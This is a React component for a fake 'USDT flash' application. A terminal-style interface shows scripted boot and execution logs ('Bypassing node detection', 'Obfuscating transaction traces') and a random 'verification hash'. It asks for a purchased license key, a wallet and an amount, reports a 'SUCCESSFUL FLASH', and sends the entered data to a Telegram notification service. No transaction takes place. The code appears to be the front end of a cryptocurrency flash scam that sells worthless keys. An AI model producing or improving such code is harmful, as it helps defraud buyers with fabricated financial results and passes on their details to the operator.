
import React, { useState, useEffect, useRef } from 'react';
import { Product, SoftwareStage } from '../types.ts';
import { validateLicenseKey, markKeyAsUsed } from '../services/licenseService.ts';
import { sendTelegramNotification } from '../services/telegramService.ts';

interface SoftwarePortalProps {
  product: Product;
  onClose: () => void;
  onPurchaseRequest: () => void;
}

const SoftwarePortal: React.FC<SoftwarePortalProps> = ({ product, onClose, onPurchaseRequest }) => {
  const [stage, setStage] = useState<SoftwareStage>('BOOT');
  const [license, setLicense] = useState('');
  const [wallet, setWallet] = useState('');
  const [amount, setAmount] = useState('');
  const [error, setError] = useState('');
  const [logs, setLogs] = useState<string[]>([]);
  const logEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (stage === 'BOOT') {
      const bootLines = [
        `Initializing ${product.name} Core v${product.version}...`,
        "Loading Dimensional Tunnelling protocols...",
        "Establishing handshakes with Forest Nodes...",
        "Quantum encryption: READY",
        "Awaiting License Verification..."
      ];
      let i = 0;
      const interval = setInterval(() => {
        setLogs(prev => [...prev, bootLines[i]]);
        i++;
        if (i === bootLines.length) {
          clearInterval(interval);
          setTimeout(() => setStage('LICENSE'), 1000);
        }
      }, 500);
      return () => clearInterval(interval);
    }
  }, [stage]);

  useEffect(() => {
    if (stage === 'EXECUTING') {
      const executionLines = [
        `Syncing with wallet: ${wallet}...`,
        `Preparing ${amount} USDT flash packet...`,
        "Bypassing node detection...",
        "Opening dimensional rift...",
        "Injecting liquidity stream...",
        "Verification hash: 0x" + Math.random().toString(16).slice(2, 10).toUpperCase(),
        "Tunneling through Block 1928374...",
        "Obfuscating transaction traces...",
        "Finalizing quantum flash..."
      ];
      let i = 0;
      const interval = setInterval(() => {
        setLogs(prev => [...prev, executionLines[i]]);
        i++;
        if (i === executionLines.length) {
          clearInterval(interval);
          setTimeout(() => setStage('COMPLETE'), 2000);
        }
      }, 800);
      return () => clearInterval(interval);
    }
  }, [stage, wallet, amount]);

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const handleLicenseSubmit = () => {
    if (validateLicenseKey(license)) {
      setStage('CONFIG');
      setError('');
    } else {
      setError('INVALID OR EXPIRED QUANTUM SIGNATURE');
    }
  };

  const handleFlashSubmit = async () => {
    if (!wallet || !amount) {
      setError('REQUIRED FIELDS MISSING');
      return;
    }
    setError('');
    setStage('EXECUTING');
    
    // Mark key as used
    markKeyAsUsed(license);

    // Send to Telegram
    await sendTelegramNotification({
      product: product.name,
      wallet,
      amount,
      license
    });
  };

  return (
    <div className="fixed inset-0 z-[1000] flex items-center justify-center bg-black/95 backdrop-blur-2xl p-4 overflow-y-auto">
      <div className="w-full max-w-3xl glass-panel rounded-[40px] border-2 border-[#0aff0a]/40 shadow-[0_0_100px_rgba(10,255,10,0.2)] overflow-hidden flex flex-col h-full max-h-[85vh]">
        {/* Terminal Header */}
        <div className="p-6 bg-[#0a1a0a] border-b border-[#0aff0a]/20 flex justify-between items-center">
          <div className="flex items-center gap-4">
            <div className="flex gap-2">
              <div className="w-3 h-3 rounded-full bg-red-500/50"></div>
              <div className="w-3 h-3 rounded-full bg-yellow-500/50"></div>
              <div className="w-3 h-3 rounded-full bg-[#0aff0a]"></div>
            </div>
            <span className="font-mono text-[10px] font-black text-[#0aff0a]/60 uppercase tracking-widest">
              Terminal: root@elon-core:/{product.id}/flash
            </span>
          </div>
          <button onClick={onClose} className="text-white/40 hover:text-red-500 transition-colors">
            <i className="fas fa-times-circle text-xl"></i>
          </button>
        </div>

        {/* Output Console */}
        <div className="flex-1 overflow-y-auto p-8 font-mono text-xs text-[#0aff0a] space-y-2 bg-black/40">
          {logs.map((log, i) => (
            <div key={i} className="flex gap-4">
              <span className="opacity-30">[{new Date().toLocaleTimeString()}]</span>
              <span>{log}</span>
            </div>
          ))}
          <div ref={logEndRef} />
          
          {stage === 'LICENSE' && (
            <div className="mt-8 p-8 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-3xl animate-[fadeIn_0.5s_ease-out] space-y-6">
              <h4 className="font-orbitron font-black text-xl text-center">LICENSE AUTHENTICATION</h4>
              <div className="flex flex-col md:flex-row gap-4">
                <input
                  type="text"
                  placeholder="ENTER QUANTUM LICENSE KEY"
                  value={license}
                  onChange={(e) => setLicense(e.target.value.toUpperCase())}
                  className="flex-1 bg-black border border-[#0aff0a]/30 rounded-xl px-5 py-4 text-center text-sm md:text-lg font-bold tracking-widest text-[#0aff0a] outline-none focus:border-[#0aff0a]"
                />
                <button 
                  onClick={handleLicenseSubmit}
                  className="px-8 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] transition-all"
                >
                  VALIDATE
                </button>
                <button 
                  onClick={onPurchaseRequest}
                  className="px-8 border border-[#0aff0a]/40 text-[#0aff0a] font-black uppercase rounded-xl hover:bg-[#0aff0a]/10 transition-all text-[10px]"
                >
                  PURCHASE KEY
                </button>
              </div>
              {error && <p className="text-red-500 font-bold text-center text-[10px] animate-pulse">{error}</p>}
            </div>
          )}

          {stage === 'CONFIG' && (
            <div className="mt-8 p-8 bg-[#0aff0a]/5 border border-[#0aff0a]/20 rounded-3xl animate-[fadeIn_0.5s_ease-out] space-y-8">
              <div className="text-center space-y-2">
                <h4 className="font-orbitron font-black text-xl">FLASH PARAMETERS</h4>
                <p className="text-[10px] opacity-60">LICENSE VALIDATED: {license}</p>
              </div>
              
              <div className="space-y-6">
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest opacity-40">Destination Wallet Address</label>
                  <input
                    type="text"
                    placeholder="Enter TRC20 / ERC20 Address"
                    value={wallet}
                    onChange={(e) => setWallet(e.target.value)}
                    className="w-full bg-black border border-[#0aff0a]/30 rounded-xl px-5 py-4 font-bold text-[#0aff0a] outline-none focus:border-[#0aff0a]"
                  />
                </div>
                <div className="space-y-2">
                  <label className="text-[10px] font-black uppercase tracking-widest opacity-40">Amount to Flash (USDT)</label>
                  <input
                    type="number"
                    placeholder="0.00"
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    className="w-full bg-black border border-[#0aff0a]/30 rounded-xl px-5 py-4 font-bold text-[#0aff0a] outline-none focus:border-[#0aff0a]"
                  />
                </div>
              </div>

              {error && <p className="text-red-500 font-bold text-center text-[10px] animate-pulse">{error}</p>}

              <button 
                onClick={handleFlashSubmit}
                className="w-full py-5 bg-[#0aff0a] text-black font-black uppercase rounded-xl hover:bg-[#00ffaa] shadow-[0_10px_30px_rgba(10,255,10,0.3)] transition-all flex items-center justify-center gap-3"
              >
                <i className="fas fa-bolt"></i> INITIATE QUANTUM FLASH
              </button>
            </div>
          )}

          {stage === 'EXECUTING' && (
            <div className="fixed inset-x-0 top-1/2 -translate-y-1/2 z-[1100] p-10 flex flex-col items-center justify-center pointer-events-none">
               <div className="glass-panel p-10 rounded-full border-2 border-[#0aff0a] animate-pulse shadow-[0_0_100px_rgba(10,255,10,0.5)]">
                 <i className="fas fa-satellite-dish text-6xl text-[#0aff0a]"></i>
               </div>
               <div className="mt-8 text-center space-y-4 bg-black/80 p-6 rounded-2xl border border-[#0aff0a]/20 backdrop-blur-md">
                 <h2 className="font-orbitron font-black text-2xl text-[#0aff0a]">FLASH IN PROGRESS</h2>
                 <p className="text-xs text-[#b0ffb0] animate-pulse">PLEASE WAIT APPROXIMATELY 1 MINUTE...</p>
                 <p className="text-[9px] text-white/30 uppercase tracking-[0.4em]">DO NOT CLOSE THIS TERMINAL</p>
               </div>
            </div>
          )}

          {stage === 'COMPLETE' && (
            <div className="mt-8 p-12 text-center space-y-10 animate-[fadeIn_0.5s_ease-out]">
              <div className="w-32 h-32 bg-[#0aff0a] text-black rounded-[40px] flex items-center justify-center mx-auto shadow-[0_0_50px_rgba(10,255,10,0.6)]">
                <i className="fas fa-check-double text-5xl"></i>
              </div>
              <div className="space-y-4">
                <h3 className="font-orbitron text-4xl font-black text-[#0aff0a]">SUCCESSFUL FLASH</h3>
                <p className="text-sm text-[#b0ffb0]/60 max-w-sm mx-auto">Liquidity has been successfully tunneled into the target node. Transaction hash is propagating.</p>
              </div>
              <button 
                onClick={onClose}
                className="w-full py-5 border-2 border-[#0aff0a] text-[#0aff0a] font-black uppercase rounded-2xl hover:bg-[#0aff0a]/10 transition-all"
              >
                DISCONNECT TERMINAL
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default SoftwarePortal;
